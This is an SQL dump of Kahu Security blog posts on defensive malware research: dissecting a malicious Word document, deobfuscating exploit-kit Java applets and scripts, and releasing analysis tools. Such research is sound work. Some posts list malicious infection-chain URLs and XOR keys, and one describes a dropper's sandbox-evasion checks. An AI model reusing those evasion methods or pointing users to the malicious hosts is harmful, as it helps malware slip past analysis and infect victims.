INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (74, 'Dissecting a Malicious Word Document', 'darryl', 'April 15, 2013', 'In a recent spearphish campaign, a malicious Word document was used to infect the email recipient. I was able to find an interesting tool and used it to recreate the Word document. Before we get to that, let’s do a quick analysis on the document…\nHere we see the Word document with an embedded object:\n\nViewing the file with Notepad, we can see that this is an RTF file and definitely looks suspicious. \n\nA little ways down, we can see a NOP sled.\n\nLet’s use OfficeMalScanner to extract the objects and confirm our suspicions.\n\nLooks like we have to use RTFScan instead. RTFScan tell us that there are matching shellcode signatures in the OBJDATA section. Then it dumps a single OLE object and suggests that we run OfficeMalScanner again.\n\nThe OLE object is rather small considering the original “file.doc” file is 791KB. Something is wrong. Here’s what the OLE file looks like:\n\nLet’s have a look at the original Word file again. This time we notice the magic for Word in hexcode.\n\nWhat if we strip away the original RTF headers and make this file look like a Word document? Maybe then OfficeMalScanner can extract the hidden binaries. With a hex editor, we do just that.\n\nSince this is hex, we need to convert it to binary and write it out to a file.\n\nWe can open this file called “file.doc_” which has the Word magic at the beginning. Now we copy the rest of the binary code from the original “file.doc” file and paste it to the bottom.\n\nNow let’s run OfficeMalScanner on this modified file using its scan and brute options…and hope this actually works. Great it does!\n\nOfficeMalScanner finds the XOR key and is able to extract two embedded files.\n\nThe first file appears to be a Word document.\n\nAnd opens in Word with a warning.\n\nThe other file is an executable.\n\nYou can actually do this the long way and carve out the embedded objects from the Word document manually but this would take more time than what’s necessary. Thanks to Frank Boldewin’s tool and a little tweaking, we can get the job done fast!\nThe exploit used is CVE-2012-0158 and seems to have very good coverage on VirusTotal (31 / 46). Here is the tool I used to recreate the malicious Word document. Actually I found two. It would be irresponsible to share these files so don’t bother asking. Sorry!\nFilename: Word-2013.1.8.exe\nMD5: ea7084ef5faa8c7721ab163cb6cb58d2\n\nFilename: MS10-087.exe\nMD5: 2898479123b90278cfc7b30ddd9c4bd6', 'cve-2012-0158, microsoft word, ms10-087, officemalscanner, spearphish', 'http://www.kahusecurity.com/?p=12679\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (75, 'Quick Java Applet Analysis', 'darryl', 'April 4, 2013', 'I saw a tweet from MalwareCrusaders  earlier today about another obfuscated Java applet so I thought I would have a look. Details about where the applet came from is rather slim. Something important may be needed along the way (e.g. applet parameters) so I prefer getting PCAPs but I’ll give it a try nonetheless.\nMalwareCrusaders will be posting more details on this soon so I won’t go too deep here. I’ll just focus on the embedded binary file which turns out to be an executable.\nDownloading the JAR from the website gives a different one each time but here’s the MD5 hash I’m working off of: 01B9B996144834146B4109719ED84AA5\nOpening the file with JD-GUI shows us an object in the JAR:\n\nThe embedded file does look encrypted:\n\nWe can tackle this two ways. One way is to bruteforce the file. The other is to reverse the applet and find the decryption routine. Let’s go through both starting with the bruteforce method.\nUsing Converter’s Key Search/Convert feature, you can import the first 1KB of the file so you can test your assumptions on a small data set. Just by looking at it, you can see diagonal waves formed by cetain characters which tells us there’s a pattern. If you don’t see any pattern then the file may be encrypted using the AES or RC4 algorithm.\n\nJust select a bunch of characters and look for repeating strings:\n55493564413855774F6A386265516455493564413855774F6A386265516455493564413855774F6A3862655\n16455493564413855774F6A386265516455493564413855774F6A386265516455493564413855774F6A3862\n65516455493564413855774F6A386265516455493564413855774F6A386265516455493564413855774F6A3\n86265516455493564413855774F6A386265516455493564413855774F6A386265516455493564413855774F\n6A386265516455493564413855774F6A386265516455493564413855774F6A3862655164554935644138557\n74F6A386265516455493564413855774F6A3862655164554935647216\nThen put them one on each line:\n4413855774F6A38626551645549356\n4413855774F6A38626551645549356\n4413855774F6A38626551645549356\n4413855774F6A38626551645549356\n4413855774F6A38626551645549356\n4413855774F6A38626551645549356\n4413855774F6A38626551645549356\nSo this looks like a 15-byte XOR key but which byte goes first? Going back to Converter, just leave the first two characters in the input box, set the input format to “hex”, then do a key search match of “M”. It will tell you what the XOR key is…77.\n\nSo 77 is the first byte:\n774F6A386265516455493564413855\nNow enter the hex string above separated by commas into Converter. Be sure you choose Hex format for the key and select the Consecutive action. Looks like it works!\n\nIf you want to write it out to a binary file, you need to make sure that you import the *entire* file (not just the first KB) and the output format must be changed to hex.\nThe second way is to reverse engineer the applet. You will have to go through each of the applet’s class files and read though the code. There’s a lot of deadends, fake data, and decoys but you will eventually end up on the last class called “U”. In it, is a string of positive and negative integers. The variable is called “encoded” and it just so happens that a few lines down, it says that the “encoded” value is passed to an “XorDecrypt” function along with a string, “wOj8beQdUI5dA8U”.\n\nFurther down, we can see the function with useless content except for the code that indicates that each byte is XORed with the string from above. This string is the decryption key.\n\nLet’s copy the strings over to Converter. Make sure the input format is dec(imal), the key format is text, the key itself is separated by commas, and the action is consecutive. Looks like it’s another class file.\n\nTo write this out, choose hex output, convert it again then write to binary file. \n\nChange the file name to whatever.class then open it up with JD-GUI. This routine takes the inputStream (which is the encrypted file) along with a decryption string which is the same string as the one above, “wOj8beQdUI5dA8U”.\n\nMD5: 6943787043e7a946c840f9d82f8088f6\nVT: 4/46', 'java applet, java deobfuscation', 'http://www.kahusecurity.com/?p=12659\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (76, 'Converter v0.7 Released', 'darryl', 'March 16, 2013', 'Malicious Java applets have been making news for awhile so I thought I would update Converter to include some new features to help with deobfuscating them.\nThis is a list of changes made to this version:\n+ Replaced Binary-to/from-Text with Binary-to/from-Hex to make it more useful\n+ Added Filter > “Keep Hex” to only keep hex characters\n+ Added Format > “Mixed Octal to Hex” to convert a mixture of text and octal to hex\n+ Added Format > “Sort Text” to sort a string\n+ Added Format > “Hex Format – CSV” separates hex values with a comma\n+ Added Tools > “String Builder” to keep values between quotes\n+ Modified “Dec-to-Hex” and “Dec-to-Octal” to handle negative integers\n+ Added “copy output to input” option to Secret Decoder Ring\n+ Added ability to import first KB (or all) of data to Key Search/Convert\n+ Eliminated extra fields in Key Search/Convert screen\n+ Made expression capability in Key Search/Convert and Convert Binary File a little more robust (added Extra > “Expressions Help”)\nHere’s a look at some of the features in action…\nThis applet used binary strings to hide its actions:\n\nJust paste it in and the Binary-to-Hex feature will split on every eight characters and convert them to hex. You can choose the Output Format using the dropdown at the bottom.\n\nHere we see an applet concatenating several variables together before it deobfuscates it:\n\nUsing the “String Builder” feature…\n\nJust paste the section in and Converter will concatenate everything between the quotes together. Make sure the beginning and ending quotes are present.\n\nThis applet is using a mix of text and octal characters:\n\nThe “Mixed Octal to Hex” feature…\n\nWill convert the string (including escaped characters) to hex.\n\nThis applet is using an array of positive and negative integers:\n\nConverter now converts decimal to hex properly.\n\nThis particular applet takes this concatenated string and deobfuscates it by running through a decoder routine three times:\n\nThe Secret Decoder Ring now allows you to copy the output to the input field so you can decode it any number of times without having to manually copy/paste each time.\n\nFinally, you can see the changes made to the Key Search/Convert screen. I tried to make the expressions as flexible as possible.\n\nYou can download Converter from here. Enjoy!', 'converter', 'http://www.kahusecurity.com/?p=12626\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (77, 'Converter v0.6 Released', 'darryl', 'February 24, 2013', 'Thank you to all of you for your feedback, patience, and support! It now has the same functions as Data Converter as described here. In addition, I’ve added a couple more features. To help you understand how to use them, let’s try it out on the latest version of Blackhole. \nI grabbed a Blackhole landing page link from a favorite site of mine, malc0de.com/database. Be sure you check it out and subscribe to the feed to get the latest!\nHere, my browser is going to get hit by a Java exploit:\n\nAnalyzing this JAR file, we see at #26 a ClassCode is being created. It is calling two functions (test.iar then test.stob).\n\nHere’s the “iar” function:\n\nAnd the “stob” function:\n\nLet’s get the string of characters from ClassCode and perform the same functions using Converter. Here’s what the array looks like. At the end of the array is the number “2” which is passed to the “iar” function as the “glueString”.\n\nWe copy the array into Converter and do a search of ” , ” and replace it with “2”.\n\nNow we use the Tools > Key Search/Convert function. You’ll notice that the Before and After Action has changed. I made it more robust to handle calculations that go beyond the original addition and subtraction actions. Looking at the “stob” function of the Java applet, each byte has 42 subtracted from it then a modulo 256 is performed. It’s also not doing any XOR function. We can replicate this in Converter like so:\n\nThe word “val” must appear in the calculate field. What Converter is doing is replacing “val” with each byte from the input field, subtracting 42 then doing a mod 256. You have to enter an XOR key but you can use a 0x00 to have it do nothing.\nYou can perform numeric operators (+ 0 * / \\ ^ mod) and boolean operators (not and or xor eqv imp) in the correct order of operation (use parenthesis). All values should be entered as decimal. To be honest, I haven’t tried all of the operators nor arithmetic functions so use at your own risk.\nI also added this functionality to the File > Convert Binary File option. Since this does file conversions and not a key search, the screen looks different. Just choose “Convert” if no XOR calculations need to be performed.\n\nHere’s the resulting file:\n\nAnd the same file loaded in JD-GUI:\n\nThe final addition is the ability to do a key search to find a matching hex code instead of just text. It can do decimal (CSV-delimited) too.\n\nData Converter has been updated to v0.5 to include the before/after actions functions and hex/decimal key searching as described above.\nIn addition, Revelo has been updated to v0.5.1. I just made some of the functions more efficient and fixed a few bugs along the way.\nAll of these tools can be found here.', 'blackhole, converter, dataconverter, revelo', 'http://www.kahusecurity.com/?p=12603\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (78, 'Another Clever Drive-By', 'darryl', 'February 23, 2013', 'This is yet another drive-by that was challenging to find. It delivered payloads from two different exploit packs making it very cruel too. Below is the infected webpage. I kept visiting this page, scrolling up and down, and nothing happened but I knew something was here based on an alert from another user’s visit. I figured it must be a malicious ad that gets rotated so I moved on to something else.\n\nAn couple hours later, I figure I would try again and get lucky. Still nothing! But this time I thought I would check out the ads. As I scrolled down, about half way down the page an ad slid out from the bottom right. My PC then got infected.\n\nThe source code of the ad box shows a redirect script.\n\nThis script shifts the block of random text by one ASCII character then renders it with a document.write. I can use Converter to show me what this obfuscated text looks like:\n\nThis is the landing page of Fiesta EK (aka Stamp EK, SofosFO). Hat tip to Fox-IT.\n\nI thought I was all done here but I looked through the rest of the HTML source and this Javascript section looked really suspicious.\n\nSince I burned through so much time on this already, I just pasted that section in Revelo and clicked on “Execute” to safely see what it would do.\n\nI curl’d the link and got this file. Nothing. Looks like I have to spoof the referer.\n\nTried again and got this. This file appears to contain a Javascript variable.\n\nI pasted this into Revelo up at the top above the previous script and hit “Execute”:\n\nSo what does this script do? It converts the variable from the second site into a URL then appends it to the body. You can whip up a simple script with the following to see how the URL gets made:\n\nIt gets rid of any character from G to Z (upper and lower case) and converts all of the special characters to “%” then unescapes what’s left. This, as you know, is the landing page of Blackhole.\n\nThe website was notified and time was given to clean it up before this post but the site still appears to be affected. It seems webmasters are having some difficulty finding and removing these types of infections lately.\nUPDATE\nI was asked to comment why this drive-by isn’t picked up by online website scanners.\n\n\nMajority of the time, these scanners work great and can detect suspicious content easily and accurately. In this case, however, the infected content is located in an iframe that only appears when the user scrolls down the page past the end of the article. This is atypical and the attacker probably took advantage of how the ad was normally presented on this website.', 'black hole, exploit kit, fiesta, obfuscated javascript', 'http://www.kahusecurity.com/?p=12585\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (79, 'Clever Redirect to Impact EK', 'darryl', 'February 7, 2013', 'This malicious script was found on a somewhat popular website. Trying to find these things is like an Easter egg hunt. This particular one was clever in more ways than one. Here’s the external script file that’s hiding in plain sight on the webpage:\n\nAnd the script itself was no ordinary redirect.\n\nHere’s a prettied-up version of the script. What the script is doing is a simple character substitution to convert those special characters into hex code. The hex code is then converted to text and eval’d. Of course it’s doing it in the most obscure way.\n\nHere’s a very quick rundown of what it does. First it takes the value of the $q variable and converts it from this:\n$q = [‘7_%3’, ‘%d|%b;%c}%4,%5~%9.%6{%e!%f+%8-%0#%2*%1&%a\nAnd the final result appears.\n\nThis leads to Impact Exploit Kit. You can find out more about this kit here:\nhttp://malware.dontneedcoffee.com/2012/12/inside-impact-exploit-kit-back-on-track.html\nhttp://malwaremustdie.blogspot.jp/2013/01/lets-say-hello-to-impact-exploit-kit-w.html', 'exploit kit, impact, javascript deobfuscation', 'http://www.kahusecurity.com/?p=12570\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (80, 'Wild Wild West – 02/2013', 'sectek', 'February 1, 2013', 'Added the following packs:\n“SofosFO”\nRed Dot\nAnonJDB\nI also moved packs around based on feedback from other researchers.', '', 'http://www.kahusecurity.com/?p=12563\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (81, 'Unpacking a Malicious Java Applet', 'darryl', 'January 14, 2013', 'Fellow researcher Denis Laskov shared the infection chain of a new exploit pack with an impressive bunch of security researchers. For some reason, I got called to help and was more than willing to contribute by analyzing the Java applet delivered by this pack. Before I jump in, be sure you check out Denis’ blog post on this exploit pack.\nHere is the applet we will be looking at. As Denis mentioned, this is heavily obfuscated and unique to each visitor. There is an embedded object in the JAR file.\n\nThis file contains gibberish but there is a visual pattern indicating that it has been XOR’d.\n\nLooking at the file with a hex editor, we can probably conclude that the file has been XOR’d with the following five bytes: C9 CB C3 A2 91\n\nBut let’s examine the JAR more closely and see if we can verify this. After looking through the code, we come across this. We can confirm that it is exploiting the latest Java vulnerability (CVE-2013-0422).\n\nFurther in the code, we see this. This takes the bytes from arrayOfByte1 and XORs bytes from arrayOfByte2.\n\nLet’s fire up Data Converter and enter those values using the settings you see below. I had to modify this program to better handle decimal keys and fix a bug that affected converting large files. Looks like this code is exploiting an older vulnerability!\n\nFinally, we get to this piece of code.\n\nThis code looks similar to the one above so we’ll use Data Converter and the same settings again. This looks interesting and warrants further investigation.\n\nLet’s change the output format to hex and convert it again. Seeing “CAFEBABE” indicates that we just found a hidden class file. If you click on “Write to Binary File”, we can save it directly to a binary file to examine it further.\n\nOpening the class file in JD-GUI, we browse through the code and get to this routine. We see that it is XOR’ing the payload using five bytes.\n\nNow let’s use File Converter using the following settings. The input file is the object found in the JAR file. Pressing the ‘convert’ button results in an executable file that infects the victim’s PC.\n\nThis new version of File Converter can now handle keys with positive and negative integers as well as hex values. Note that decimal values of -55, -53, -61, -94, and -111 is the same as hex values of C9, CB, C3, A2, and 91 so entering either keys in this program would yield the same results.\nYou can download the newer versions of the programs above here. I’ll incorporate the changes in the next version of Converter when I’m done testing.\nAgain, special thanks to Denis for helping me test the programs.', 'dataconverter, deobfuscation, fileconverter, java', 'http://www.kahusecurity.com/?p=12559\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (82, 'Converter Update', 'darryl', 'January 2, 2013', 'Happy New Year! I finally finished developing and testing another version of Converter. It has been updated to version 0.5 which includes features written about in recent blog posts, plus a few extras.\n\nUnder the File menu, I’ve added three new features.\n\nYou can import binary files into Converter (but don’t try loading a 100MB file though since that’s not what Converter was meant for). The file contents will show up as hex data which you can send to the main form or back out to a text file.\n\nYou can also export binary files from hex data.\n\nIf your file is too big for Converter to handle, you can split files into smaller segments (and subsequently join them back together).\n\nIf you need to convert a large file, you can always use the Convert Binary File feature. I incorporated new options found in another program I wrote called File Converter. You can read about it here:\n\nUnder the Tools menu, I added the Secret Decoder Ring feature.\n\nYou can learn how to use this feature from this blog post: \n\nThe Convert Base feature now includes a new delimiter per request.\n\nAnd finally, the Key Search/Convert feature has been enhanced as described in this post: \n\nYou can get Converter here. I hope you enjoy this update!', 'converter', 'http://www.kahusecurity.com/?p=12547\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (83, 'Wild Wild West – 12/2012', 'sectek', 'December 1, 2012', 'Added the folllowing packs:\nalphaPack\nVintage Pack\nCritXPack\nSerenity Exploit Pack\nProPack\nANRAM Exploit Pack', 'exploit kits', 'http://www.kahusecurity.com/?p=12535\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (84, 'New Exploit Pack Spotted', 'darryl', 'November 26, 2012', 'Another new exploit pack has been found in the wild. This pack uses two interesting methods to obfuscate its contents. Both methods aren’t brand new but interesting nonetheless. Let’s have a closer look…\nHere’s the infection chain:\ntmkgm.lflinkup.com/main.php\nalpkfbtgy.lflinkup.com/3227fyw/024776ygcgd.asp?1\nalpkfbtgy.lflinkup.com/06592657829ja/qrsop326821?1\nalpkfbtgy.lflinkup.com/06592657829ja/rke80886\nalpkfbtgy.lflinkup.com/06592657829ja/lib1.pdf\nalpkfbtgy.lflinkup.com/06592657829ja/39723568va1start\nalpkfbtgy.lflinkup.com/06592657829ja/ncai8236581\nThe first two URLs are redirectors to the main landing page which is “qrsop326821”. When I first looked at this HTML page, I thought the file got corrupted in Wireshark but it’s actually not.\n\nHere’s the Javascript portion. The script basically loops through the code to re-sort itself back into its original form.\n\nAnd this is what the deobfuscated code looks like:\n\nHere’s what the transformation looks like since it’s rather difficult to describe.\n\nIn a recent update, this pack now separates the Javascript from the HTML page by storing it in an external file.\n\nAs you can see from the landing page, there’s two sets of exploits — Java and PDF. The PDF contains the LibTiff exploit and shellcode which does a download and execute of the final payload file. When the Java applet appears to use two exploits and if successful then it downloads a JPEG file that doesn’t have the correct magic number.\n\nOpening the file with a hex editor shows that every other byte is a garbage character and that this is really an executable.\n\nI updated a program I wrote earlier to extract every other byte and dump it to a file.\n\nThese are the results I got:\nFile: rke80886.jar (CVE-2012-4681, CVE-2012-1723)\nMD5: E2B9C1892F7BA7D0DC69EBFC91098636\nVT: 1 / 43\nFile: lib1.pdf (CVE-2010-0188)\nMD5: B80B7119A6AC1596C7467C1942CD0CD1\nVT: 4 / 44\nFile: EXE Payload\nMD5: 7B89036D65CA53FD133FAC4F75DD4770\nVT: 27 / 44\nThis pack hasn’t been identified yet so if anyone knows its name, please drop me a note.', 'exploit kit, obfuscated javascript', 'http://www.kahusecurity.com/?p=12531\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (85, 'Exploit Packs and the Secret Decoder Ring', 'darryl', 'November 17, 2012', 'If you’ve ever analyzed an exploit pack, you will often see a string of strange characters as parameters to a Java applet. You might have even noticed a certain pattern suggesting that this isn’t random characters. Here’s what I’m talking about; have a look at the parameter values for Black Hole:\n\nIn a version of Black Hole early in the month, you could find this in the HTTP request generated by the Java applet itself:\n\nThese strings are the URLs of the payload obscured using a secret decoder so to speak. Every two characters is a byte that represents a position in a key. If you extract the results from the key and concatenate them, you’ll have the URL.\nWhat’s the key? Each author or exploit pack version could have its own unique key but we can try to figure out what the key is; we just have to work in reverse. I wrote a program that might be of some help so let’s try this out on Black Hole version 2.\nFirst we have to obtain this string of encoded characters and the URL of the payload. I’ve done a little Wiresharking that yielded the following:\n\nI’ve pasted the values in the program and set it to “Position Lookup”, two-character formatting with a hex type:\n\nIf you press the “Analyze” button right now, it will tell you that the output field is empty (it needs to have a starting string to build off of) so the program will then insert a string of ` characters for you like so:\n\nNow press the “Analyze” button once again. It will fill in the positions of the key based on what is known — the encoded values and the URL.\n\nLet’s get another set of strings from another instance of Black Hole and put that into the program but this time we leave the output value alone because we want to add to our existing (partial) key.\n\nKeep going, trying to find a good mix of characters based off of the payload URL. After a few more, you’ll probably end up with this:\ndq&`pg“3twh_`v“kz““o8sa`0`y:`u-m“`2b7`4f““/i`6ej1c=n`.?9`x`5lr“““\nThe left over ` characters reveal missing values. By counting those up, we can guess that those are upper case characters and a couple more symbols. What we have are all the lower case characters, numbers, and significant symbols which may be enough. Now let’s use the key, paste in just the encoded value, and this time click on the “Decode” button:\n\nCool! If you haven’t figured out how this position lookup works, the above graphic should make it more clear. The first two bytes of the encoded value (“text input” field) are “0b”. Just above the “Key/Substitution” field are a set of incrementing hex values. Go to position 0x0b and get the character directly underneath it, which is “h”. That’s the first character of the URL! The next two characters are “09” so go to the 0x09 position and get that character which is “t”. Got it?\nNow we can use this secret key to find out what the payload URLs are for this variant of Black Hole v2…until the key is changed.\nInterestingly, I analyzed a new exploit pack that Kafeine found called Cool Exploit Pack and noticed the same-looking string of encoded characters. I put that into the program using the Black Hole key and guess what…it worked! What’s the odds of two exploit pack authors using the same secret decoder?\n\nThe program also helps you tackle another type of “encoding method” called character substitution. The program acts a little differently for this method. You will need to enter a “plain text” value. I’ve already included a common set of URL-related characters but it probably won’t work for all cases so you can adjust it as needed. In addition, the length of the “plain text” must match the length of the starting string (all those ` characters) since this is a subtitution cipher after all.\nHere we have the payload URL for yet another new exploit pack called CritXPack. We plug this into the fields and click on the “Analyze” button. In this particular substitution cipher, the first character of the encoded string is “d” which corresponds to “h”, “X” corresponds to “t”, and so on. \n\nAgain, you would find other instances of this exploit pack, collect enough encoded strings and URLs to build up the key until you have all of the useful characters. Then you can keep that key for decoding future CritXPack’s payload URLs.\nThis program is now available on the Tools page.', 'black hole, cipher, cool exploit, critxpack, exploit kit', 'http://www.kahusecurity.com/?p=12521\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (86, 'KaiXin Exploit and Tool Update', 'darryl', 'November 10, 2012', 'Just a quick follow-up of an in-depth article from Denis Laskov which you can read here. Denis kindly provided me with the pack and I noticed that this strange text file was getting downloaded:\n\nThis sort of looks like an EXE file structure so I imported the file as hex, truncated it so I could do an XOR search for “MZ” quickly. Found the key!\n\nNow I can load up the entire file then XOR it with the key, 0xA2, but something doesn’t look right.\n\nAll the 0xA2 values should actually be 0x00s. The KaiXin author(s) only encoded non-0x00 values. Clever. So I check this box then convert it again.\n\nOkay, that looks better. Now let’s write it out to a binary file and check it against VirusTotal. Here are the results:\nMD5: a2528ea962ce621b3b0f190a1d1e904e\nVT: 25 / 43\nI updated this Data Converter tool to incorporate some new ideas like the one above. It can also enumerate all the keys to an external file because sometimes you don’t know what you are looking for.\nI also included the ability to add or subtract a decimal value before and after performing the action. This suggestion came from Kafeine (thanks!) when trying to extract an encrypted class file from a JAR.\nIf there are no major bugs then I’ll be adding this to the Converter tool later. You can download this and other programs directly from this site now on the Tools page.', 'data converter, exploit kit, kaixin', 'http://www.kahusecurity.com/?p=12509\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (87, 'Not A Very Nice Pack', 'darryl', 'November 1, 2012', 'Someone just rigged an unsubscribe page with a Nice Pack drive-by! How cruel is that?! At least this gives us another reason not to click on links in email, even if it is to opt-out.\nHere’s the unsubscribe page:\n\nAnd the source code showing the malicious iframe tag:\n\nWhen we follow the TDS link, we get to an HTML page with obfuscated Javascript.\n\nLooking closely at the code, we can make the following change and deobfuscate the script.\n\nWe can see that this page delivers two exploits — a Java and PDF exploit.\n\nThe interesting bits can be found in the Java applet so let’s have a closer look at this. In this particular section of the Class3 file, it converts that string of hex into another class file.\n\nLet’s just do a quick dump of the hex code to a file and see what the output looks like. We can see a URL. Hmm, what are these four decimal values?\n\nWhen we make a request to that URL, we get a file. Ugh, this is not an executable file BUT we can see a pattern.\n\nLet’s bring the file into Converter. We see a repeating series of four bytes, 31 7A 4D 2F, where it should be all zeros. Hey, that’s the hexadecimal equivalent of the decimal values above.\n\nIf we go to Tools > Key Search/Convert, we can test our assumption by XOR’ing the hex code with the four bytes above. Yup, now that’s an executable!\n\nNow let’s go to File > Convert Binary File and convert it for real.\n\nHere’s the URLs used by Nice Pack but it keeps changing of course:\nfamfdie.lflinkup.com/in.cgi?15\norkvx.lflinkup.com/ssd\norkvx.lflinkup.com/qFoKRz/NQMwb1jfexg0y?ndr=EOTOTRTw2f2vTBvRTK\norkvx.lflinkup.com/lFoKRz/NQMwb1jfexg0y\norkvx.lflinkup.com/mFoKRz/NQMwb1jfexg0y\norkvx.lflinkup.com/f4FoKRz/NQMwb1jfexg0y\nAnd these are the results from Virus Total:\nFile: mor.exe\nMD5: 9e98e10fb67e9fa76880d05a8417760e\nVT: 23 / 42\nFile: NQMwb1jfexg0y.pdf (CVE-2010-0188)\nMD5: eb8cf298785bdba58c44db9db16731cf\nVT: 3/44\nFile: NQMwb1jfexg0y.jar (CVE-2012-1723)\nMD5: 67d43b24a9333981efc9df8fa5049894\nVT: 4/44', 'deobfuscation, exploit kit, javascript, nice pack', 'http://www.kahusecurity.com/?p=12503\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (88, 'Wild Wild West – 10/2012', 'sectek', 'October 23, 2012', 'Added the folllowing packs:\n“KaiXin Exploit Pack”\n“Kein Exploit Pack”\nGrandsoft\nCool Pack\nNucSoft\n“AssocAID”\nSpecial thanks to Mila from Contagio!  Be sure to check out her list of exploits used by exploit packs.', 'exploit kits', 'http://www.kahusecurity.com/?p=12485\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (89, 'Security Tools – New and Updated', 'darryl', 'October 1, 2012', 'Over the past several months, I’ve been busy with various projects and helping others with their analysis and in the process, whipped up a couple of new tools to share. I hope you find them to be useful. These have been tested on Windows XP and 7. When dealing with live malware, be sure you take the necessary precautions like using a virtualized environment. No warranties, use at your own risk.\nConverter v0.4\nSome bug fixes and minor updates were made:\n* “Convert Base” feature has been expanded to enable you to convert from/to decimal values separated by commas or spaces. Single-value conversions still work.\n* The “Convert Custom Base64” feature now lets you convert to hex as well as text.\n* Replaced the “XOR Encrypt/Decrypt” feature with “Key Search/Convert” that allows you to do XOR, ROTate, or ShiFT searches and conversions from/to text, hex, or comma-separated decimal values (see Data Converter below).\n\nFile: Converter v0.4.zip\nMD5: D4D92BD5D73361205110B0B8ED2B5DD8\nLink: http://www.mediafire.com/download.php?gay9f1dq3cv40xb\nRevelo v0.5\nI fixed some bugs and added a new method called “Redirect Function with Name”. What this allows you to do is redirect a function to an outside script that displays the contents of the eval’d function. As an example, here we see a compressed script. We select the method, enter the word “function”, and set the option to “Replace Starting at Top” to make sure we catch the first topmost instance then click on “Execute”. The results appear on the Results tab.\n\nWhat’s going on behind-the-scenes is that Revelo modifies the script from this:\n<script>eval(function(p,a,c,k,e,d)…\nTo this:\n<script>eval(zyxyz=function(p,a,c,k,e,d)…\nThen adds this to the end:\n<script>alert(zyxyz);</script>\nI also added the ability to do these replacements just once instead of doing it for all matches.\nFile: Revelo v0.5.zip\nMD5: F639E4F6E1E7CA93EFE11EBF1838F6E5\nLink: http://www.mediafire.com/download.php?7j6ur67mhruq0it\nPHP Converter\nThis tool really did not need to be made but I was asked by a friend to come up with an easy way to handle obfuscated PHP files found on compromised hosts for a non-PHP, security newbie. The best option is really to learn PHP and have Portable XAMPP (or similar) on-hand.\nTo “deobfuscate”, choose the nested options from inside-out.\n\nTo “obfuscate” text, choose the nested options from outside-in. Credit to James Johnston of TechKnow Professional Services. This program also contains cryptography software by David Ireland of DI Management Services Pty Ltd .\nFile: PHPConverter.zip\nMD5: 859AFA779782408EBB75D8C2FFAD94E6\nLink: http://www.mediafire.com/download.php?9amb1ahv8sq0qdy\nData Converter\nI’ve been coming across Java applets using XOR encryption for awhile now. Using a debugger like Eclipse is the way to go but sometimes I find that I just want to get an idea of what’s going on so I whipped up this quick and dirty tool.\nThis program allows you to take in text, hexcode, or decimal values delimited using comma separation. The key and output format can be any of the three as well. You can choose the XOR, ROTate, or ShiFT method and the action can be single (same key for the entire run), sequential (converts the input using the first key, runs through it again using the second key, etc), and consecutive (loops through each of the keys for the length of the input).\nHere’s an example taken from a malicious Java applet:\n\nThis program is now part of Converter but you can download this separately if you want.\nFile: File_Converter.zip\nMD5: 635957B1B66A8CE5349EDB3EC589E491\nLink: http://www.mediafire.com/download.php?c99gh0oir3774g8\nSandbox Tester\nI needed to test an automated sandbox analysis tool. Without getting too fancy or sophisticated I came up with several methods to get my test malware through. I eventually came up with just over a dozen methods but this program incorporates only four of those methods. To prevent abuse, you can’t select your own binary to drop. Sorry!\nFirst choose your drop location, add a drop delay value in seconds (set it to 0 for no delay), and the name of the drop file.\nThe “Name Check” option checks to see if the name of the drop file has changed. If so, the dropper will quit without doing anything. The “Loc Check” checks to see if the location of the drop file is not “c:\\documents and settings\\” or “c:\\users\\”. If yes, then the dropper will quit.\nIf you choose the “Mouse Aware” option then the dropper watches the mouse to see if it moves within the drop delay time. If not then the program quits. If you choose a short delay value then it may not give the dropper enough time to check for movement so bear that in mind.\nThe last option is “Active Window”. If the dropper sees that the menubar or desktop is in the foreground (top-most window), the program quits. Again, you may need to up the delay value to give enough time to check for user activity.\n\nWhen you make your selections and click on “Create” then this program creates the dropper. This is what you upload to the sandbox. When the sandbox executes the dropper then an executable is dropped into the location you specified, waits a number of seconds (if applicable), then pops up a “Hello World” message and drops an .EXE file to the current path. That file is actually just a text file that contains the Eicar string.\n\nFile: SandboxTester.zip\nMD5: E47C4248C4FC8096A81636FD5FD546B1\nLink: http://www.mediafire.com/download.php?9bnvyfdeygecnp7', 'converter, revelo', 'http://www.kahusecurity.com/?p=12482\n');
